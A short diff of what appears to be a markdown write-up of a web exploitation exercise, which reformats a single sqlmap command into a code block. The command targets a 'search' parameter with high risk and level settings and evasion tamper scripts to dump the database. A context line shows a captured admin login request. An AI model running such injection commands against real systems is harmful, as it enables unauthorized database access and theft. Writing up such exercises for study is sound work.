@@ -36,7 +36,9 @@ username=admin&login=&password=Pass
 
 + Use sqlmap to exploit. In sqlmap, use 'search' parameter to dump the database. 
 
-`python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db`
+```
+python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
+```
 
 ```
 ---
